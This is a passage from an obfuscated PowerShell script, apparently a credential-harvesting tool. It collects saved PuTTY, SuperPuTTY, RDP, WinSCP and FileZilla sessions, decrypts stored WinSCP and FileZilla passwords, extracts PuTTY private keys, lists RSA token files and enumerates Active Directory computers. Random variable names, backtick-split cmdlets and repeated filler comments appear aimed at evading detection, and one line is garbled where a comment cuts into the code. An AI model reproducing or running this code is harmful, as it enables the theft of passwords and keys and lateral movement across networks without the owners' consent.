        Switch ($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz.Extension) {
          ".ppk" {[void]$vLCzqZfXfTRAtutlzMndAJztthLCt.Add($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz)}
          ".rdp" {[void]$skJFGTkoRQFyjrkRqfHA.Add($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz)}
          ".sdtid" {[void]$OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ.Add($lqdoiawDTFBwBHhKTUCnfKMKcjJBUz)}
        }
      }
    }
  }

}

function ProcessThoroughRemote($FilePathsFound) {

  foreach ($FilePath in $FilePathsFound) {
      # Microsoft".
      $giGoVUFnWokjHWoErNuEp = "" | Select-Object -Property Source,Path
      $giGoVUFnWokjHWoErNuEp.Source = $yrXBuCaLhrdSTnqtsWwWMZCNjTqZYZaXKF

      $GizQpeRZckkDqhkapHHLRZCpormsPpt = [IO.Path]::GetExtension($FilePath.Name)

      if ($GizQpeRZckkDqhkapHHLRZCpormsPpt -eq ".ppk") {
        $giGoVUFnWokjHWoErNuEp.Path = $FilePath.Name
        [void]$vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.Add($giGoVUFnWokjHWoErNuEp)
      } elseif ($GizQpeRZckkDqhkapHHLRZCpormsPpt -eq ".rdp") {
        $giGoVUFnWokjHWoErNuEp.Path = $FilePath.Name
        [void]$ALyYGPldjWMXbilDGXXuwzTiScIOh.Add($giGoVUFnWokjHWoErNuEp)
      } elseif ($GizQpeRZckkDqhkapHHLRZCpormsPpt -eq ".sdtid") {
        $giGoVUFnWokjHWoErNuEp.Path = $FilePath.Name
        [void]$ROkBCNKdDchnbbrBbYFwJJ.Add($giGoVUFnWokjHWoErNuEp)
      }

  }

  if ($vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.count -gt 0) {

    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PPK Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ALyYGPldjWMXbilDGXXuwzTiScIOh

    if ($nFdMHRmJUTihVghjwpEMqoB) {
      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Format-List | Out-String
    }
  }

  if ($ALyYGPldjWMXbilDGXXuwzTiScIOh.count -gt 0) {

    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ALyYGPldjWMXbilDGXXuwzTiScIOh

    if ($nFdMHRmJUTihVghjwpEMqoB) {
      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Format-List | Out-String
    }
  }
  if ($ROkBCNKdDchnbbrBbYFwJJ.count -gt 0) {

    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "sdtid Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ROkBCNKdDchnbbrBbYFwJJ

    if ($nFdMHRmJUTihVghjwpEMqoB) {
      $ROkBCNKdDchnbbrBbYFwJJ | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ROkBCNKdDchnbbrBbYFwJJ | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessPuTTYLocal($KDkkbfOPgFTEDJyySsRbZ) {
  
  # Microsoft".
  foreach($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $KDkkbfOPgFTEDJyySsRbZ) {

    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT = "" | Select-Object -Property Source,Session,Hostname

    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Source = $BMsqhbcZYwkwfMupnghp
    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Session = (Split-Path $jJfvKMjAIHuOyRrBLbIaxRVixJIp -Leaf)
    $WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $jJfvKMjAIHuOyRrBLbIaxRVixJIp) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)

    # Microsoft".
    [void]$novtuvVGrxDTTVCRNsEwoC.Add($WtlaLODdIgPDYiuagmShNMQqmMzmrSofalkeGcXpEFmT)

  }

  if ($nFdMHRmJUTihVghjwpEMqoB) {
    $novtuvVGrxDTTVCRNsEwoC | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $novtuvVGrxDTTVCRNsEwoC | Format-List | Out-String
  }

  # Microsoft".
  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $novtuvVGrxDTTVCRNsEwoC

} # Microsoft".

function ProcessRDPLocal($wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE) {

  # Microsoft".
  foreach($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $wnhJBuUaSOFdXzcjoqHLbUhxvFFCSAGeHUfBzE) {

    $PathToRDPSession = "Microsoft.PowerShell.Core\Registry::" + $jJfvKMjAIHuOyRrBLbIaxRVixJIp

    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI = "" | Select-Object -Property Source,Hostname,Username

    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI.Source = $BMsqhbcZYwkwfMupnghp
    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI.Hostname = (Split-Path $jJfvKMjAIHuOyRrBLbIaxRVixJIp -Leaf)
    $UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI.Username = ((Get-ItemProperty -Path $PathToRDPSession -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)

    # Microsoft".
    [void]$BtUaCCvgPWNHcXFnMqfwlhRaRHPBu.Add($UabIWmFwufkgjQPAnNCTULiLofOVGsPZrfjgzI)

  } # Microsoft".

  if ($nFdMHRmJUTihVghjwpEMqoB) {
    $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu | Format-List | Out-String
  }

  # Microsoft".
  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $BtUaCCvgPWNHcXFnMqfwlhRaRHPBu

} # Microsoft".

function ProcessWinSCPLocal($FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm) {
  
  # Microsoft".
  foreach($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $FOLhptEooVzDRsgCiQbMuulJMtfvQUPgbDkm) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $jJfvKMjAIHuOyRrBLbIaxRVixJIp

    $XLgMsnHgjGNxngdhjsJDumISm = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $XLgMsnHgjGNxngdhjsJDumISm.Source = $BMsqhbcZYwkwfMupnghp
    $XLgMsnHgjGNxngdhjsJDumISm.Session = (Split-Path $jJfvKMjAIHuOyRrBLbIaxRVixJIp -Leaf)
    $XLgMsnHgjGNxngdhjsJDumISm.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $XLgMsnHgjGNxngdhjsJDumISm.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $XLgMsnHgjGNxngdhjsJDumISm.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($XLgMsnHgjGNxngdhjsJDumISm.Password) {
      $DzkJihLBUKqMjcDFcYdQZojZfg = ((Get-ItemProperty -Path (Join-Path $txgGeZgPwCbJEodqAEpGXCWnFc.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # Microsoft".
      if (!$DzkJihLBUKqMjcDFcYdQZojZfg) {
          $XLgMsnHgjGNxngdhjsJDumISm.Password = (DecryptWinSCPPassword $XLgMsnHgjGNxngdhjsJDumISm.Hostname $XLgMsnHgjGNxngdhjsJDumISm.Username $XLgMsnHgjGNxngdhjsJDumISm.Password)
      # Microsoft".
      } else {
          $XLgMsnHgjGNxngdhjsJDumISm.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # Microsoft".
    [void]$NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF.Add($XLgMsnHgjGNxngdhjsJDumISm)

  } # Microsoft".

  if ($nFdMHRmJUTihVghjwpEMqoB) {
    $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF | Format-List | Out-String
  }

  # Microsoft".
  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $NUgoIBqEFfqnICmHgTEYcFyaLOsVsCF

} # Microsoft".

function ProcesssdtidFile($OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ) {

  foreach ($Path in $OjyOLUObkBJstThdcFNXDjmuBpqQSQZAZZ.VersionInfo.FileName) {

    $siFYcXvgZXvqnezNoNLuSPILDVqWVwF = "" | Select-Object -Property "Source","Path"

    $siFYcXvgZXvqnezNoNLuSPILDVqWVwF."Source" = $BMsqhbcZYwkwfMupnghp
    $siFYcXvgZXvqnezNoNLuSPILDVqWVwF."Path" = $Path

    [void]$ROkBCNKdDchnbbrBbYFwJJ.Add($siFYcXvgZXvqnezNoNLuSPILDVqWVwF)

  }

  if ($ROkBCNKdDchnbbrBbYFwJJ.count -gt 0) {

    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "sdtid Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ROkBCNKdDchnbbrBbYFwJJ

    if ($nFdMHRmJUTihVghjwpEMqoB) {
      $ROkBCNKdDchnbbrBbYFwJJ | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $ROkBCNKdDchnbbrBbYFwJJ | Select-Object * | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessRDPFile($skJFGTkoRQFyjrkRqfHA) {
  
  # Microsoft".
  foreach ($Path in $skJFGTkoRQFyjrkRqfHA.VersionInfo.FileName) {
    
    $WXqDceOEICanOnclBfEuImAqvR = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"

    $WXqDceOEICanOnclBfEuImAqvR."Source" = (Hostname)

    # Microsoft".
    $WXqDceOEICanOnclBfEuImAqvR."Path" = $Path 
    $WXqDceOEICanOnclBfEuImAqvR."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $WXqDceOEICanOnclBfEuImAqvR."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $WXqDceOEICanOnclBfEuImAqvR."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}

    if (!$WXqDceOEICanOnclBfEuImAqvR."Administrative Session" -or !$WXqDceOEICanOnclBfEuImAqvR."Administrative Session" -eq 0) {
      $WXqDceOEICanOnclBfEuImAqvR."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $WXqDceOEICanOnclBfEuImAqvR."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" -or $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" -eq 0) {
      $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" = "No"
    } else {
      $WXqDceOEICanOnclBfEuImAqvR."Prompts for Credentials" = "Yes"
    }

    [void]$ALyYGPldjWMXbilDGXXuwzTiScIOh.Add($WXqDceOEICanOnclBfEuImAqvR)

  }

  if ($ALyYGPldjWMXbilDGXXuwzTiScIOh.count -gt 0) {

    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "RDP Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $ALyYGPldjWMXbilDGXXuwzTiScIOh

    if ($nFdMHRmJUTihVghjwpEMqoB) {
      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $ALyYGPldjWMXbilDGXXuwzTiScIOh | Select-Object * | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessPPKFile($vLCzqZfXfTRAtutlzMndAJztthLCt) {

  # Microsoft".
  foreach ($Path in $vLCzqZfXfTRAtutlzMndAJztthLCt.VersionInfo.FileName) {

    # Microsoft".
    $LWMRzhYReweJfHeHvrZbeaqGE = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $LWMRzhYReweJfHeHvrZbeaqGE."Source" = (Hostname)

    # Microsoft".
    $LWMRzhYReweJfHeHvrZbeaqGE."Path" = $Path

    $LWMRzhYReweJfHeHvrZbeaqGE."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $LWMRzhYReweJfHeHvrZbeaqGE."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $LWMRzhYReweJfHeHvrZbeaqGE."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $whYQKtTARRiHtwRZgjfzPkSweWwNgjFYcYQLNDVUhivvN = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $LWMRzhYReweJfHeHvrZbeaqGE."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$whYQKtTARRiHtwRZgjfzPkSweWwNgjFYcYQLNDVUhivvN).Context.PostContext -Join "" } catch {}
    $LWMRzhYReweJfHeHvrZbeaqGE."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Microsoft".
    [void]$vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.Add($LWMRzhYReweJfHeHvrZbeaqGE)

  }

  if ($vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio.count -gt 0) {

    $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "PPK Files" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio

    if ($nFdMHRmJUTihVghjwpEMqoB) {
      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Select-Object * | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $vlmJLoZtYNNkciksuCeMKgsSegTSzeIaBfdWhQJtSHio | Select-Object * | Format-List | Out-String
    }

  }

} # Microsoft".

function ProcessFileZillaFile($FileZillaXML) {

  # Microsoft".
  foreach($FileZillaSession in $FileZillaXML.SelectNodes('//FileZilla3/Servers/Server')) {
      # Microsoft".
      $FileZillaSessionHash = @{}

      # Microsoft".
      $FileZillaSession.ChildNodes | ForEach-Object {

          $FileZillaSessionHash["Source"] = $BMsqhbcZYwkwfMupnghp
          # Microsoft".
          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $FileZillaSessionHash["Password"] = $_.InnerText
              } else {
                  # Microsoft".
                  $FileZillaSessionHash[$_.Name] = $_.InnerText
              }
              
          }

      }

    # Microsoft".
    [void]$cTWMuhzRBpgLjOdAEBuayABpY.Add((ne`w`-`ob`je`ct PSObject -Property $FileZillaSessionHash | Select-Object -Property * -ExcludeProperty "# Microsoft".
     
  } # Microsoft".
  
  # Microsoft".
  foreach ($jJfvKMjAIHuOyRrBLbIaxRVixJIp in $cTWMuhzRBpgLjOdAEBuayABpY) {
      $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Password))
      if ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq "0") {
        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Use FTP over TLS if available"
      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 1) {
        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Use SFTP"
      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 3) {
        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Require implicit FTP over TLS"
      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 4) {
        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Require explicit FTP over TLS"
      } elseif ($jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol -eq 6) {
        $jJfvKMjAIHuOyRrBLbIaxRVixJIp.Protocol = "Only use plain FTP (insecure)"
      } 
  }

  if ($nFdMHRmJUTihVghjwpEMqoB) {
    $cTWMuhzRBpgLjOdAEBuayABpY | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $cTWMuhzRBpgLjOdAEBuayABpY | Format-List | Out-String
  }

  # Microsoft".
  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $cTWMuhzRBpgLjOdAEBuayABpY

} # Microsoft".

function ProcessSuperPuTTYFile($xSUZWiIFWzdJkYAJQeScDzPWnccWPMi) {

  foreach($ZoAeqEXTgmGBHKNxaPPbOgnK in $xSUZWiIFWzdJkYAJQeScDzPWnccWPMi.ArrayOfSessionData.SessionData) {

    foreach ($AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot in $ZoAeqEXTgmGBHKNxaPPbOgnK) { 
      if ($AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot -ne $null) {

        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"

        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Source" = $BMsqhbcZYwkwfMupnghp
        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."SessionId" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.SessionId
        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."SessionName" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.SessionName
        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Host" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.Host
        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Username" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.Username
        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."ExtraArgs" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.ExtraArgs
        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."Port" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.Port
        $JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg."PuTTY Session" = $AZDdIuOKdDkWoumfGSxXbKDMviqTIgBbLWfqNJIJOCot.PuttySession

        [void]$bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY.Add($JTFHqlFaBTwLpVAwnvPLfivcocAffioMgqGlqzg)
      } 
    }

  } # Microsoft".

  if ($nFdMHRmJUTihVghjwpEMqoB) {
    $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY | Export-CSV -Append -Path ($GAwlvlpwYPsIYDQPRdOJ + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY | Out-String
  }

  # Microsoft".
  $tHugALOaXKmLXhgXdEjXRUOG | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -yCaKhRBajwZzcFWZzuZktofiNRuUCqIyVO $bVQdQAAqTINLSHvHqjXEZwziqugApeKaNLAuGJkXTzUWY

} # Microsoft".

# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".

# Microsoft".
function GetComputersFromActiveDirectory {

  $wmzNfMEjOpeoWDQkxJDXcNEkb = "computer"
  $wlqyguoGbshdmwDvBzLXdNBNSlRpEunqI = ne`w`-`ob`je`ct System.DirectoryServices.DirectoryEntry
  $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx = ne`w`-`ob`je`ct System.DirectoryServices.DirectorySearcher
  $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.SearchRoot = $wlqyguoGbshdmwDvBzLXdNBNSlRpEunqI
  $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.Filter = ("(objectCategory=$wmzNfMEjOpeoWDQkxJDXcNEkb)")

  $LoDyYWKcMPvtkHqzZQVycmH = "name"

  foreach ($siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB in $LoDyYWKcMPvtkHqzZQVycmH){$BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.PropertiesToLoad.Add($siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB)}

  return $BwYFYtvCQVMnoAWefAeBqqDblskfndvoablYhzRzWLkx.FindAll()

}

function DecryptNextCharacterWinSCP($KmVVznheIoYeNIpCKrKGB) {

  # Microsoft".
  $PRZaizlQkUpzJtbxkiNHnBq = "" | Select-Object -Property flag,remainingPass

  # Microsoft".
  $CftzolxiaTvewpYOwFcnmFUOM = ("0123456789ABCDEF".indexOf($KmVVznheIoYeNIpCKrKGB[0]) * 16)
  $GhoXaDkxaizTwheQnxeNpnYIUMHjKgzRnKhMfVXw = "0123456789ABCDEF".indexOf($KmVVznheIoYeNIpCKrKGB[1])

  $eWDyaAbCsmbMCQqdkCftUFHNHVSQxvuursjjSzCG = $CftzolxiaTvewpYOwFcnmFUOM + $GhoXaDkxaizTwheQnxeNpnYIUMHjKgzRnKhMfVXw

  $oYCDTFjjZtOYSwlIdWZDZKIya = (((-bnot ($eWDyaAbCsmbMCQqdkCftUFHNHVSQxvuursjjSzCG -bxor $NwtyKsIWYgNpJaxgjzNuEEySZProptMvhByLjrqUPqLQh)) % 256) + 256) % 256

  $PRZaizlQkUpzJtbxkiNHnBq.flag = $oYCDTFjjZtOYSwlIdWZDZKIya
  $PRZaizlQkUpzJtbxkiNHnBq.remainingPass = $KmVVznheIoYeNIpCKrKGB.Substring(2)

  return $PRZaizlQkUpzJtbxkiNHnBq

}

function DecryptWinSCPPassword($BjXqGlysvPulWtXjHANsQcPjf, $RXvafiJLcKyQUqvcDhnUDJOnISJmZvJzSDPDIoWhicQm, $XssJWKNYEUORVeOpxpTFwFu) {

  $CKvkIuaRKMKLojDxNUTvCrXLbMjSWhExI = 255
  $NwtyKsIWYgNpJaxgjzNuEEySZProptMvhByLjrqUPqLQh = 163

  $kWGCmMAAAdfXCjvqnbChWwweYjlAmRQuoMDRSHSFRh = 0
  $xADyGlHiIQVUrJgxGSXjJHPObHBmiKWrjAKFtuHM =  $BjXqGlysvPulWtXjHANsQcPjf + $RXvafiJLcKyQUqvcDhnUDJOnISJmZvJzSDPDIoWhicQm
  $LSKnMueepExhzlzaygoEcRax = DecryptNextCharacterWinSCP($XssJWKNYEUORVeOpxpTFwFu)

  $lFlqOowtxSqfXzobxsUrRXwmXZjXAxCXyUxDTTmuucr = $LSKnMueepExhzlzaygoEcRax.flag 

  if ($LSKnMueepExhzlzaygoEcRax.flag -eq $CKvkIuaRKMKLojDxNUTvCrXLbMjSWhExI) {
    $LSKnMueepExhzlzaygoEcRax.remainingPass = $LSKnMueepExhzlzaygoEcRax.remainingPass.Substring(2)
    $LSKnMueepExhzlzaygoEcRax = DecryptNextCharacterWinSCP($LSKnMueepExhzlzaygoEcRax.remainingPass)
  }

  $kWGCmMAAAdfXCjvqnbChWwweYjlAmRQuoMDRSHSFRh = $LSKnMueepExhzlzaygoEcRax.flag

  $LSKnMueepExhzlzaygoEcRax = DecryptNextCharacterWinSCP($LSKnMueepExhzlzaygoEcRax.remainingPass)
  $LSKnMueepExhzlzaygoEcRax.remainingPass = $LSKnMueepExhzlzaygoEcRax.remainingPass.Substring(($LSKnMueepExhzlzaygoEcRax.flag * 2))

  $PdQXYlSDgcHDgfbDoCppJPYnD = ""
  for ($siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB=0; $siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB -lt $kWGCmMAAAdfXCjvqnbChWwweYjlAmRQuoMDRSHSFRh; $siWLljurxJoBJluwwQDaVqJPBZEDSlJGnUjB++) {
    $LSKnMueepExhzlzaygoEcRax = (DecryptNextCharacterWinSCP($LSKnMueepExhzlzaygoEcRax.remainingPass))
    $PdQXYlSDgcHDgfbDoCppJPYnD += [char]$LSKnMueepExhzlzaygoEcRax.flag
  }

  if ($lFlqOowtxSqfXzobxsUrRXwmXZjXAxCXyUxDTTmuucr -eq $CKvkIuaRKMKLojDxNUTvCrXLbMjSWhExI) {
    return $PdQXYlSDgcHDgfbDoCppJPYnD.Substring($xADyGlHiIQVUrJgxGSXjJHPObHBmiKWrjAKFtuHM.length)
  }

  return $PdQXYlSDgcHDgfbDoCppJPYnD

}
